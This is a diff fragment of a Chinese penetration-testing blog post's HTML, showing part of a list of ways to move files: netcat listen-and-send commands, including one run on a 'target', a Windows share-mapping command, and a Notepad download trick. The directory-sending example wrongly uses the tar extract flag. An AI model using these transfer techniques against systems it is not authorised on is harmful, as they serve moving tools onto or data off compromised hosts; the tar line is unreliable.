+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat file | nc -l 1234</span><br></pre></td></tr></table></figure>
+<p>target执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc host_ip 1234 &gt; file</span><br></pre></td></tr></table></figure>
+<p><strong>Netcat补充</strong>：</p>
+<p><code>传输文件</code></p>
+<p>方法一：</p>
+<p>接收端，先监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 3737 &gt; test.txt</span><br></pre></td></tr></table></figure>
+<p>传送端，发送</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc [ip] 3737 &lt; test.txt</span><br></pre></td></tr></table></figure>
+<p>方法二：</p>
+<p>发送端，先监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 3737 &lt; test.txt</span><br></pre></td></tr></table></figure>
+<p>接收端，连接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc [ip] 3737 &gt; test.txt</span><br></pre></td></tr></table></figure>
+<p><code>传送目录</code></p>
+<p>传送目录操作与传送文件类似，但不同的是需要先压缩再解压缩，并且管道后面最后必须是 - ，不能是其余自定义的文件名</p>
+<p>接收端，先监听并准备解压缩</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 3737 | tar zxvf -</span><br></pre></td></tr></table></figure>
+<p>发送端，压缩并发送</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar zxvf - * | nc [ip] 3737</span><br></pre></td></tr></table></figure>
+<h2 id="0x12-Window-文件共享"><a href="#0x12-Window-文件共享" class="headerlink" title="0x12 Window 文件共享"></a>0x12 Window 文件共享</h2><p>使用如下命令:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use x: \127.0.0.1\share /user:example.comuserID myPassword</span><br></pre></td></tr></table></figure>
+<h2 id="0x13-记事本："><a href="#0x13-记事本：" class="headerlink" title="0x13 记事本："></a>0x13 记事本：</h2><ul>
+<li><ol>
+<li>打开记事本</li>
+</ol>
+</li>
+<li><ol>
+<li>文件，打开</li>
+</ol>
+</li>
+<li><ol>
+<li>在文件名处填入下载地址</li>
+</ol>
+</li>
+</ul>
+<p><img src="https://evi1cg.github.io/usr/uploads/2015/12/1319444800.png" alt="1-1"></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透测试</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/Knlvre.github-io/2019/10/04/十三种方式下载文件/">展开全文 >></a>
         </p>
       
 
@@ -1660,11 +1660,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">基础知识点</a>
+                <a href="javascript:void(0)" class="js-tag color5">Sqli-labs</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">Sqli-labs</a>
+                <a href="javascript:void(0)" class="js-tag color1">基础知识点</a>
               </li>
              
               <li class="article-tag-list-item">
